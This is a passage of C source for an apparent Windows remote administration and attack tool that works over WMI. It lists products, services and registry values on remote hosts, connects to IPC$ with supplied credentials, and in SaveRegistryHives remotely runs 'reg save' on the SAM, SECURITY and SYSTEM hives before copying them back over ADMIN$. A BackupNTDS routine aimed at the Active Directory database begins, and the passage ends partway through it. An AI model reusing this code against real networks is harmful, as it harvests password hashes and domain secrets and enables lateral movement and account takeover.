			hResult = CoSetProxyBlanket( pEnumerator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE );
		}
		else
		{
			hResult = CoSetProxyBlanket( pEnumerator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, authIdentity, EOAC_NONE );
		}

		while ( pEnumerator )
		{
			pObject = NULL;

			hResult = pEnumerator->Next( WBEM_INFINITE, 1, &pObject, &uReturned );

			if ( SUCCEEDED( hResult ) )
			{
				if ( uReturned == 0 )
				{
					break;
				}

				strcpy( szDisplayName,     "" );
				strcpy( szInstallDate,     "" );
				strcpy( szInstallLocation, "" );

				hResult = pObject->Get( L"Caption", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szDisplayName, 128, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"InstallDate", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szInstallDate, 128, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"InstallLocation", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szInstallLocation, 1024, NULL, NULL );

				VariantClear( &vtProperty );

				pObject->Release();

				if ( !*bMultipleHosts )
				{
					if ( i == 0 )
					{
						printf( "\n" );
						printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
						printf( "+++++           PRODUCT INFORMATION           +++++\n" );
						printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
						printf( "\n" );

						i++;
					}

					printf( "Display Name:      %s\n", szDisplayName );
					printf( "Install Date:      %s\n", szInstallDate );
					printf( "Install Location:  %s\n", szInstallLocation );

					printf( "\n" );

					fflush( stdout );
				}

				WaitForSingleObject( hSemaphore, INFINITE );

				pOutputFile = fopen( "Reports\\ProductInfo.txt", "r" );

				if ( pOutputFile != NULL )
				{
					fclose( pOutputFile );
				}
				else
				{
					pOutputFile = fopen( "Reports\\ProductInfo.txt", "w" );

					if ( pOutputFile != NULL )
					{
						fprintf( pOutputFile, "NOTE: This file is tab separated. Open with Excel to view and sort information.\n" );
						fprintf( pOutputFile, "\n" );
						fprintf( pOutputFile, "Hostname\tDisplay Name\tInstall Date\tInstall Location\n" );

						fclose( pOutputFile );
					}
				}

				pOutputFile = fopen( "Reports\\ProductInfo.txt", "a+" );

				if ( pOutputFile != NULL )
				{
					fprintf( pOutputFile, "%s\t%s\t%s\t%s\n", szTarget, szDisplayName, szInstallDate, szInstallLocation );

					fclose( pOutputFile );
				}

				ReleaseSemaphore( hSemaphore, 1, NULL );
			}
		}
	}
	else
	{
		strcpy( szFunction, "ExecQuery (GetWMIProductInfo)" );

		WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
	}

	SysFreeString( bszQueryLanguage );
	SysFreeString( bszQuery );
}

VOID GetWMIServiceInfo( CHAR szTarget[], IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, BOOL *bMultipleHosts )
{
	DWORD                               i;
	CHAR                  szQueryLanguage[ 128 ];
	CHAR                          szQuery[ 128 ];
	WCHAR                wszQueryLanguage[ 256 ];
	WCHAR                        wszQuery[ 256 ];
	BSTR                 bszQueryLanguage;
	BSTR                         bszQuery;
	IEnumWbemClassObject     *pEnumerator;
	HRESULT                       hResult;
	IWbemClassObject             *pObject;
	ULONG                       uReturned;
	CHAR                    szDisplayName[ 128 ];
	CHAR                    szServiceName[ 128 ];
	CHAR                       szPathName[ 1024 ];
	CHAR                      szStartName[ 128 ];
	CHAR                      szStartMode[ 128 ];
	CHAR                          szState[ 128 ];
	CHAR                    szDescription[ 1024 ];
	VARIANT                    vtProperty;
	FILE                     *pOutputFile;
	CHAR                       szFunction[ 128 ];

	i = 0;

	strcpy( szQueryLanguage, "WQL" );
	strcpy( szQuery,         "Select * from Win32_Service" );

	MultiByteToWideChar( CP_ACP, 0, szQueryLanguage, strlen( szQueryLanguage ) + 1, wszQueryLanguage, sizeof( wszQueryLanguage ) / sizeof( wszQueryLanguage[0] ) );
	MultiByteToWideChar( CP_ACP, 0, szQuery, strlen( szQuery ) + 1, wszQuery, sizeof( wszQuery ) / sizeof( wszQuery[0] ) );

	bszQueryLanguage = SysAllocString( wszQueryLanguage );
	bszQuery         = SysAllocString( wszQuery );

	pEnumerator = NULL;

	hResult = pService->ExecQuery( bszQueryLanguage, bszQuery, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator );

	if ( SUCCEEDED( hResult ) )
	{
		if ( *bImpersonate )
		{
			hResult = CoSetProxyBlanket( pEnumerator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE );
		}
		else
		{
			hResult = CoSetProxyBlanket( pEnumerator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, authIdentity, EOAC_NONE );
		}

		while ( pEnumerator )
		{
			pObject = NULL;

			hResult = pEnumerator->Next( WBEM_INFINITE, 1, &pObject, &uReturned );

			if ( SUCCEEDED( hResult ) )
			{
				if ( uReturned == 0 )
				{
					break;
				}

				strcpy( szDisplayName, "" );
				strcpy( szServiceName, "" );
				strcpy( szPathName,    "" );
				strcpy( szStartName,   "" );
				strcpy( szStartMode,   "" );
				strcpy( szState,       "" );
				strcpy( szDescription, "" );

				hResult = pObject->Get( L"DisplayName", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szDisplayName, 128, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"Name", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szServiceName, 128, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"PathName", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szPathName, 1024, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"StartName", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szStartName, 128, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"StartMode", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szStartMode, 128, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"State", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szState, 128, NULL, NULL );

				VariantClear( &vtProperty );

				hResult = pObject->Get( L"Description", 0, &vtProperty, NULL, NULL );
				
				WideCharToMultiByte( CP_ACP, 0, vtProperty.bstrVal, -1, szDescription, 1024, NULL, NULL );

				VariantClear( &vtProperty );

				pObject->Release();

				if ( !*bMultipleHosts )
				{
					if ( i == 0 )
					{
						printf( "\n" );
						printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
						printf( "+++++           SERVICE INFORMATION           +++++\n" );
						printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
						printf( "\n" );

						i++;
					}

					printf( "Display Name: %s\n", szDisplayName );
					printf( "Service Name: %s\n", szServiceName );
					printf( "File Path:    %s\n", szPathName );
					printf( "Account:      %s\n", szStartName );
					printf( "Start Type:   %s\n", szStartMode );
					printf( "Status:       %s\n", szState );
					printf( "Description:  %s\n", szDescription );

					printf( "\n" );

					fflush( stdout );
				}

				WaitForSingleObject( hSemaphore, INFINITE );

				pOutputFile = fopen( "Reports\\ServiceInfo.txt", "r" );

				if ( pOutputFile != NULL )
				{
					fclose( pOutputFile );
				}
				else
				{
					pOutputFile = fopen( "Reports\\ServiceInfo.txt", "w" );

					if ( pOutputFile != NULL )
					{
						fprintf( pOutputFile, "NOTE: This file is tab separated. Open with Excel to view and sort information.\n" );
						fprintf( pOutputFile, "\n" );
						fprintf( pOutputFile, "Hostname\tDisplay Name\tService Name\tFile Path\tAccount\tStart Type\tStatus\tDescription\n" );

						fclose( pOutputFile );
					}
				}

				pOutputFile = fopen( "Reports\\ServiceInfo.txt", "a+" );

				if ( pOutputFile != NULL )
				{
					fprintf( pOutputFile, "%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n", szTarget, szDisplayName, szServiceName, szPathName, szStartName, szStartMode, szState, szDescription );

					fclose( pOutputFile );
				}

				ReleaseSemaphore( hSemaphore, 1, NULL );
			}
		}
	}
	else
	{
		strcpy( szFunction, "ExecQuery (GetWMIServiceInfo)" );

		WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
	}

	SysFreeString( bszQueryLanguage );
	SysFreeString( bszQuery );
}

VOID GetWMIRegistryInfo( CHAR szTarget[], IWbemServices *pService, BOOL *bMultipleHosts )
{
	HRESULT                     hResult;
	BSTR                   bszClassName;
	BSTR                 bszMethod1Name;
	BSTR                 bszMethod2Name;
	IWbemClassObject            *pClass;
	IWbemClassObject        *pInParams1;
	IWbemClassObject        *pInParams2;
	IWbemClassObject   *pClassInstance1;
	IWbemClassObject   *pClassInstance2;
	FILE             *pRegistryInfoFile;
	DWORD                             i;
	CHAR                         szLine[ 512 ];
	CHAR                    szSplitText[ 128 ];
	CHAR                   szSubKeyName[ 256 ];
	CHAR                      szKeyName[ 128 ];
	CHAR                    szValueType[ 128 ];
	WCHAR                 wszSubKeyName[ 512 ];
	WCHAR                    wszKeyName[ 256 ];
	BSTR                  bszSubKeyName;
	BSTR                     bszKeyName;
	VARIANT                    vtDefKey;
	VARIANT                vtSubKeyName;
	VARIANT                 vtValueName;
	BOOL                      bContinue;
	CHAR                     szKeyValue[ 128 ];
	IWbemClassObject        *pOutParams;
	VARIANT                    vtResult;
	DWORD                    dwKeyValue;
	FILE                   *pOutputFile;
	CHAR                     szFunction[ 128 ];
	CHAR                     szErrorMsg[ 128 ];

	bszClassName   = SysAllocString( L"StdRegProv" );
	bszMethod1Name = SysAllocString( L"GetStringValue" );
	bszMethod2Name = SysAllocString( L"GetDWORDValue" );

	pClass = NULL;

	hResult = pService->GetObject( bszClassName, 0, NULL, &pClass, NULL );

	if ( SUCCEEDED( hResult ) )
	{
		pInParams1 = NULL;

		hResult = pClass->GetMethod( bszMethod1Name, 0, &pInParams1, NULL );

		pInParams2 = NULL;

		hResult = pClass->GetMethod( bszMethod2Name, 0, &pInParams2, NULL );

		if ( SUCCEEDED( hResult ) )
		{
			pClassInstance1 = NULL;

			hResult = pInParams1->SpawnInstance( 0, &pClassInstance1 );

			pClassInstance2 = NULL;

			hResult = pInParams2->SpawnInstance( 0, &pClassInstance2 );

			if ( SUCCEEDED( hResult ) )
			{
				pRegistryInfoFile = fopen( "RegistryInfo.input", "r" );

				if ( pRegistryInfoFile != NULL )
				{
					i = 0;

					while ( fgets( szLine, sizeof( szLine ), pRegistryInfoFile ) != NULL )
					{
						Trim( szLine );

						if ( szLine[0] != '#' && szLine[0] != '\n' )
						{
							if ( szLine[strlen( szLine ) - 1] == '\n' )
							{
								szLine[strlen( szLine ) - 1] = '\0';
							}

							strcpy( szSplitText, ":" );

							if ( SplitRegistryInfo( szLine, szSplitText, szSubKeyName, szKeyName, szValueType ) )
							{
								MultiByteToWideChar( CP_ACP, 0, szSubKeyName, strlen( szSubKeyName ) + 1, wszSubKeyName, sizeof( wszSubKeyName ) / sizeof( wszSubKeyName[0] ) );
								MultiByteToWideChar( CP_ACP, 0, szKeyName, strlen( szKeyName ) + 1, wszKeyName, sizeof( wszKeyName ) / sizeof( wszKeyName[0] ) );

								bszSubKeyName = SysAllocString( wszSubKeyName );
								bszKeyName    = SysAllocString( wszKeyName );

								vtDefKey.vt   = VT_I4;
								vtDefKey.lVal = 0x80000002; // HKEY_LOCAL_MACHINE

								vtSubKeyName.vt      = VT_BSTR;
								vtSubKeyName.bstrVal = bszSubKeyName;

								vtValueName.vt      = VT_BSTR;
								vtValueName.bstrVal = bszKeyName;

								bContinue = FALSE;

								strcpy( szKeyValue, "" );

								hResult    = NULL;
								pOutParams = NULL;

								if ( strcmp( szValueType, "REG_SZ" ) == 0 )
								{
									hResult = pClassInstance1->Put( L"hDefKey", 0, &vtDefKey, 0 );
									hResult = pClassInstance1->Put( L"sSubKeyName", 0, &vtSubKeyName, 0 );
									hResult = pClassInstance1->Put( L"sValueName", 0, &vtValueName, 0 );

									hResult = pService->ExecMethod( bszClassName, bszMethod1Name, NULL, NULL, pClassInstance1, &pOutParams, NULL );

									if ( SUCCEEDED( hResult ) )
									{
										hResult = pOutParams->Get( L"sValue", 0, &vtResult, NULL, 0 );

										if ( SUCCEEDED( hResult ) && vtResult.bstrVal != NULL )
										{
											bContinue = TRUE;

											WideCharToMultiByte( CP_ACP, 0, vtResult.bstrVal, -1, szKeyValue, 128, NULL, NULL );
										}

										VariantClear( &vtResult );
									}
									else
									{
										strcpy( szFunction, "ExecMethod (GetWMIRegistryInfo)" );

										WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
									}
								}

								if ( strcmp( szValueType, "REG_DWORD" ) == 0 )
								{
									hResult = pClassInstance2->Put( L"hDefKey", 0, &vtDefKey, 0 );
									hResult = pClassInstance2->Put( L"sSubKeyName", 0, &vtSubKeyName, 0 );
									hResult = pClassInstance2->Put( L"sValueName", 0, &vtValueName, 0 );

									hResult = pService->ExecMethod( bszClassName, bszMethod2Name, NULL, NULL, pClassInstance2, &pOutParams, NULL );

									if ( SUCCEEDED( hResult ) )
									{
										hResult = pOutParams->Get( L"uValue", 0, &vtResult, NULL, 0 );

										if ( SUCCEEDED( hResult ) && vtResult.uintVal != NULL )
										{
											bContinue = TRUE;

											dwKeyValue = vtResult.uintVal;

											sprintf( szKeyValue, "%d", dwKeyValue );
										}

										VariantClear( &vtResult );
									}
									else
									{
										strcpy( szFunction, "ExecMethod (GetWMIRegistryInfo)" );

										WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
									}
								}

								if ( bContinue )
								{
									if ( !*bMultipleHosts )
									{
										if ( i == 0 )
										{
											printf( "\n" );
											printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
											printf( "+++++          REGISTRY INFORMATION           +++++\n" );
											printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
											printf( "\n" );

											i++;
										}

										printf( "Registry Key:   HKLM\\%s\\\\%s\n", szSubKeyName, szKeyName );
										printf( "Registry Value: %s\n", szKeyValue );

										printf( "\n" );

										fflush( stdout );
									}

									WaitForSingleObject( hSemaphore, INFINITE );

									pOutputFile = fopen( "Reports\\RegistryInfo.txt", "r" );

									if ( pOutputFile != NULL )
									{
										fclose( pOutputFile );
									}
									else
									{
										pOutputFile = fopen( "Reports\\RegistryInfo.txt", "w" );

										if ( pOutputFile != NULL )
										{
											fprintf( pOutputFile, "NOTE: This file is tab separated. Open with Excel to view and sort information.\n" );
											fprintf( pOutputFile, "\n" );
											fprintf( pOutputFile, "Hostname\tRegistry Key\tRegistry Value\n" );

											fclose( pOutputFile );
										}
									}

									pOutputFile = fopen( "Reports\\RegistryInfo.txt", "a+" );

									if ( pOutputFile != NULL )
									{
										fprintf( pOutputFile, "%s\tHKLM\\%s\\\\%s\t%s\n", szTarget, szSubKeyName, szKeyName, szKeyValue );

										fclose( pOutputFile );
									}

									ReleaseSemaphore( hSemaphore, 1, NULL );

									pOutParams->Release();
								}

								VariantClear( &vtDefKey );
								VariantClear( &vtSubKeyName );
								VariantClear( &vtValueName );

								SysFreeString( bszSubKeyName );
								SysFreeString( bszKeyName );
							}
							else
							{
								strcpy( szFunction, "SplitRegistryInfo (GetWMIRegistryInfo)" );
								strcpy( szErrorMsg, "Split problem with file RegQueryKeys.input." );

								WriteToErrorLog( szTarget, szFunction, szErrorMsg, bMultipleHosts );
							}
						}
					}

					fclose( pRegistryInfoFile );
				}
				else
				{
					strcpy( szFunction, "fopen (GetWMIRegistryInfo)" );
					strcpy( szErrorMsg, "Cannot open file RegistryInfo.input." );

					WriteToErrorLog( szTarget, szFunction, szErrorMsg, bMultipleHosts );
				}

				pClassInstance1->Release();
				pClassInstance2->Release();
			}
			else
			{
				strcpy( szFunction, "SpawnInstance (GetWMIRegistryInfo)" );

				WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
			}

			pInParams1->Release();
			pInParams2->Release();
		}
		else
		{
			strcpy( szFunction, "GetMethod (GetWMIRegistryInfo)" );

			WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
		}

		pClass->Release();
	}
	else
	{
		strcpy( szFunction, "GetObject (GetWMIRegistryInfo)" );

		WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
	}

	SysFreeString( bszClassName );
	SysFreeString( bszMethod1Name );
	SysFreeString( bszMethod2Name );
}

VOID Trim( CHAR szText[] )
{
	DWORD           i;
	DWORD dwStartChar;
	DWORD   dwEndChar;
	CHAR   szTempText[ 10240 ];
	DWORD           j;

	i = 0;

	while ( i < strlen( szText ) )
	{
		if ( szText[i] == ' ' )
		{
			i++;
		}
		else
		{
			break;
		}
	}

	dwStartChar = i;

	i = strlen( szText ) - 1;

	while ( i > 0 )
	{
		if ( szText[i] == ' ' )
		{
			i--;
		}
		else
		{
			break;
		}
	}

	dwEndChar = i;

	i = dwStartChar;
	j = 0;

	while ( i <= dwEndChar )
	{
		szTempText[j] = szText[i];

		i++;
		j++;
	}

	szTempText[j] = '\0';

	strcpy( szText, szTempText );
}

BOOL SplitRegistryInfo( CHAR szText[], CHAR szSplitText[], CHAR szSubKeyName[], CHAR szKeyName[], CHAR szValueType[] )
{
	BOOL         bReturn;
	CHAR      *pLocation;
	DWORD dwTextLocation;
	DWORD              i;
	DWORD              j;
	CHAR     szStartText[ 128 ];
	DWORD              k;
	CHAR       szEndText[ 128 ];

	bReturn = FALSE;

	pLocation = strstr( szText, szSplitText );

	dwTextLocation = (INT)( pLocation - szText );

	i = 0;

	while ( pLocation != NULL )
	{
		j = 0;

		while ( j < dwTextLocation )
		{
			szStartText[j] = szText[j];

			j++;
		}

		szStartText[j] = '\0';

		j = dwTextLocation + strlen( szSplitText );

		k = 0;

		while ( j < strlen( szText ) )
		{
			szEndText[k] = szText[j];

			j++;
			k++;
		}

		szEndText[k] = '\0';

		strcpy( szText, szEndText );

		if ( i == 0 )
		{
			strcpy( szSubKeyName, szStartText );
		}

		if ( i == 1 )
		{
			bReturn = TRUE;

			strcpy( szKeyName,   szStartText );
			strcpy( szValueType, szEndText );
		}

		i++;

		pLocation = strstr( szText, szSplitText );

		dwTextLocation = (INT)( pLocation - szText );
	}

	return bReturn;
}

BOOL Connect( CHAR szTarget[], CHAR szUsername[], CHAR szPassword[], BOOL *bMultipleHosts )
{
	BOOL                  bReturn;
	CHAR             szTempTarget[ 128 ];
	CHAR             szRemoteName[ 128 ];
	CHAR               *pLocation;
	DWORD          dwTextLocation;
	DWORD                       i;
	CHAR             szDomainName[ 128 ];
	DWORD                       j;
	CHAR           szTempUsername[ 128 ];
	WCHAR           wszRemoteName[ 256 ];
	WCHAR           wszDomainName[ 256 ];
	WCHAR             wszUsername[ 256 ];
	WCHAR             wszPassword[ 256 ];
	DWORD                 dwLevel;
	USE_INFO_2            ui2Info;
	NET_API_STATUS        nStatus;
	DWORD                 dwError;
	CHAR               szFunction[ 128 ];

	bReturn = FALSE;

	sprintf( szTempTarget, "\\\\%s", szTarget );

	sprintf( szRemoteName, "%s\\IPC$", szTempTarget );

	pLocation = strstr( szUsername, "\\" );

	if ( pLocation != NULL )
	{
		dwTextLocation = (INT)( pLocation - szUsername );

		i = 0;

		while ( i < dwTextLocation )
		{
			szDomainName[i] = szUsername[i];

			i++;
		}

		szDomainName[i] = '\0';

		i = dwTextLocation + 1;

		j = 0;

		while ( i < strlen( szUsername ) )
		{
			szTempUsername[j] = szUsername[i];

			i++;
			j++;
		}

		szTempUsername[j] = '\0';
	}
	else
	{
		if ( strcmp( szUsername, "" ) != 0 )
		{
			strcpy( szDomainName, szTarget );
		}
		else
		{
			strcpy( szDomainName, "" );
		}

		strcpy( szTempUsername, szUsername );
	}

	MultiByteToWideChar( CP_ACP, 0, szRemoteName,   strlen( szRemoteName ) + 1,   wszRemoteName, sizeof( wszRemoteName ) / sizeof( wszRemoteName[0] ) );
	MultiByteToWideChar( CP_ACP, 0, szDomainName,   strlen( szDomainName ) + 1,   wszDomainName, sizeof( wszDomainName ) / sizeof( wszDomainName[0] ) );
	MultiByteToWideChar( CP_ACP, 0, szTempUsername, strlen( szTempUsername ) + 1, wszUsername,   sizeof( wszUsername ) / sizeof( wszUsername[0] ) );
	MultiByteToWideChar( CP_ACP, 0, szPassword,     strlen( szPassword ) + 1,     wszPassword,   sizeof( wszPassword ) / sizeof( wszPassword[0] ) );

	dwLevel = 2;

	ui2Info.ui2_local      = NULL;
	ui2Info.ui2_remote     = wszRemoteName;
	ui2Info.ui2_password   = wszPassword;
	ui2Info.ui2_asg_type   = USE_IPC;
	ui2Info.ui2_username   = wszUsername;
	ui2Info.ui2_domainname = wszDomainName;

	nStatus = NetUseAdd( NULL, dwLevel, (BYTE *)&ui2Info, NULL );

	if ( nStatus == NERR_Success )
	{
		bReturn = TRUE;
	}
	else
	{
		dwError = nStatus;

		strcpy( szFunction, "NetUseAdd (Connect)" );

		WriteLastErrorToErrorLog( szTarget, szFunction, &dwError, bMultipleHosts );
	}

	return bReturn;
}

BOOL Disconnect( CHAR szTarget[], BOOL *bMultipleHosts )
{
	BOOL                 bReturn;
	CHAR            szTempTarget[ 128 ];
	CHAR            szRemoteName[ 128 ];
	WCHAR          wszRemoteName[ 256 ];
	NET_API_STATUS       nStatus;
	DWORD                dwError;
	CHAR              szFunction[ 128 ];

	bReturn = FALSE;

	sprintf( szTempTarget, "\\\\%s", szTarget );

	sprintf( szRemoteName, "%s\\IPC$", szTempTarget );

	MultiByteToWideChar( CP_ACP, 0, szRemoteName, strlen( szRemoteName ) + 1, wszRemoteName, sizeof( wszRemoteName ) / sizeof( wszRemoteName[0] ) );

	nStatus = NetUseDel( NULL, wszRemoteName, USE_LOTS_OF_FORCE );

	if ( nStatus == NERR_Success )
	{
		bReturn = TRUE;
	}
	else
	{
		dwError = nStatus;

		strcpy( szFunction, "NetUseDel (Disconnect)" );

		WriteLastErrorToErrorLog( szTarget, szFunction, &dwError, bMultipleHosts );
	}

	return bReturn;
}

VOID SaveRegistryHives( CHAR szTarget[], IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, BOOL *bMultipleHosts )
{
	HRESULT                     hResult;
	BSTR                   bszClassName;
	BSTR                  bszMethodName;
	IWbemClassObject            *pClass;
	IWbemClassObject         *pInParams;
	IWbemClassObject    *pClassInstance;
	DWORD                             i;
	DWORD                             j;
	CHAR                      szKeyName[ 128 ];
	CHAR                 szSaveFileName[ 128 ];
	CHAR                  szCommandLine[ 128 ];
	WCHAR                wszCommandLine[ 256 ];
	BSTR                 bszCommandLine;
	VARIANT               vtCommandLine;
	IWbemClassObject        *pOutParams;
	VARIANT                    vtResult;
	DWORD                   dwProcessID;
	DWORD                             k;
	BOOL                        bResult;
	CHAR              szSaveFilePathSrc[ 256 ];
	CHAR             szSaveFilePathDest[ 256 ];
	CHAR                     szFunction[ 128 ];

	bszClassName  = SysAllocString( L"Win32_Process" );
	bszMethodName = SysAllocString( L"Create" );

	pClass = NULL;

	hResult = pService->GetObject( bszClassName, 0, NULL, &pClass, NULL );

	if ( SUCCEEDED( hResult ) )
	{
		pInParams = NULL;

		hResult = pClass->GetMethod( bszMethodName, 0, &pInParams, NULL );

		if ( SUCCEEDED( hResult ) )
		{
			pClassInstance = NULL;

			hResult = pInParams->SpawnInstance( 0, &pClassInstance );

			if ( SUCCEEDED( hResult ) )
			{
				i = 0;

				for ( j = 0; j < 3; j++ )
				{
					if ( j == 0 )
					{
						strcpy( szKeyName, "HKLM\\SAM" );

						sprintf( szSaveFileName, "%s-SAM", szTarget );
					}

					if ( j == 1 )
					{
						strcpy( szKeyName, "HKLM\\SECURITY" );

						sprintf( szSaveFileName, "%s-SECURITY", szTarget );
					}

					if ( j == 2 )
					{
						strcpy( szKeyName, "HKLM\\SYSTEM" );

						sprintf( szSaveFileName, "%s-SYSTEM", szTarget );
					}

					sprintf( szCommandLine, "cmd.exe /c reg save %s %%SystemRoot%%\\%s /y", szKeyName, szSaveFileName );

					MultiByteToWideChar( CP_ACP, 0, szCommandLine, strlen( szCommandLine ) + 1, wszCommandLine, sizeof( wszCommandLine ) / sizeof( wszCommandLine[0] ) );

					bszCommandLine = SysAllocString( wszCommandLine );

					vtCommandLine.vt      = VT_BSTR;
					vtCommandLine.bstrVal = bszCommandLine;

					pOutParams = NULL;

					hResult = pClassInstance->Put( L"CommandLine", 0, &vtCommandLine, 0 );

					hResult = pService->ExecMethod( bszClassName, bszMethodName, NULL, NULL, pClassInstance, &pOutParams, NULL );

					if ( SUCCEEDED( hResult ) )
					{
						hResult = pOutParams->Get( L"ProcessId", 0, &vtResult, NULL, 0 );

						if ( SUCCEEDED( hResult ) && vtResult.uintVal != NULL )
						{
							dwProcessID = vtResult.uintVal;

							k = 0;

							while ( k < 20 )
							{
								bResult = IsProcessRunning( szTarget, pService, authIdentity, bImpersonate, &dwProcessID, bMultipleHosts );

								if ( !bResult )
								{
									break;
								}

								Sleep( 1000 );
							}

							sprintf( szSaveFilePathSrc, "\\\\%s\\ADMIN$\\%s", szTarget, szSaveFileName );
							sprintf( szSaveFilePathDest, "Reports\\%s", szSaveFileName );

							if ( !*bMultipleHosts )
							{
								if ( i == 0 )
								{
									printf( "\n" );
									printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
									printf( "+++++           SAVE REGISTRY HIVES           +++++\n" );
									printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
									printf( "\n" );

									i++;
								}

								printf( "Saving Registry Hive: %s\n", szSaveFilePathSrc );

								fflush( stdout );
							}

							DeleteFile( szSaveFilePathDest );

							bResult = MoveFile( szSaveFilePathSrc, szSaveFilePathDest );

							if ( !bResult )
							{
								strcpy( szFunction, "MoveFile (SaveRegistryHives)" );

								WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
							}
						}

						VariantClear( &vtResult );

						pOutParams->Release();
					}
					else
					{
						strcpy( szFunction, "ExecMethod (SaveRegistryHives)" );

						WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
					}

					VariantClear( &vtCommandLine );

					SysFreeString( bszCommandLine );
				}

				if ( i > 0 )
				{
					if ( !*bMultipleHosts )
					{
						printf( "\n" );

						fflush( stdout );
					}
				}

				pClassInstance->Release();
			}
			else
			{
				strcpy( szFunction, "SpawnInstance (SaveRegistryHives)" );

				WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
			}

			pInParams->Release();
		}
		else
		{
			strcpy( szFunction, "GetMethod (SaveRegistryHives)" );

			WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
		}

		pClass->Release();
	}
	else
	{
		strcpy( szFunction, "GetObject (SaveRegistryHives)" );

		WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
	}

	SysFreeString( bszClassName );
	SysFreeString( bszMethodName );
}

VOID BackupNTDS( CHAR szTarget[], IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, BOOL *bMultipleHosts )
{
	HRESULT                     hResult;
	BSTR                   bszClassName;
	BSTR                  bszMethodName;
	IWbemClassObject            *pClass;
	IWbemClassObject         *pInParams;
	IWbemClassObject    *pClassInstance;
	DWORD                             i;
	CHAR                  szCommandLine[ 256 ];
	WCHAR                wszCommandLine[ 512 ];
	BSTR                 bszCommandLine;
	VARIANT               vtCommandLine;
	IWbemClassObject        *pOutParams;
	VARIANT                    vtResult;
	DWORD                   dwProcessID;
	BOOL                        bResult;
	DWORD                             j;
	CHAR              szSaveFilePathSrc[ 256 ];
	CHAR             szSaveFilePathDest[ 256 ];
	CHAR                     szFunction[ 128 ];

	bszClassName  = SysAllocString( L"Win32_Process" );
	bszMethodName = SysAllocString( L"Create" );

	pClass = NULL;

	hResult = pService->GetObject( bszClassName, 0, NULL, &pClass, NULL );

	if ( SUCCEEDED( hResult ) )
	{
		pInParams = NULL;

		hResult = pClass->GetMethod( bszMethodName, 0, &pInParams, NULL );

		if ( SUCCEEDED( hResult ) )
		{
			pClassInstance = NULL;

			hResult = pInParams->SpawnInstance( 0, &pClassInstance );

			if ( SUCCEEDED( hResult ) )
			{
				i = 0;

				strcpy( szCommandLine, "cmd.exe /c rmdir /s /q %SystemRoot%\\WMIDump" );

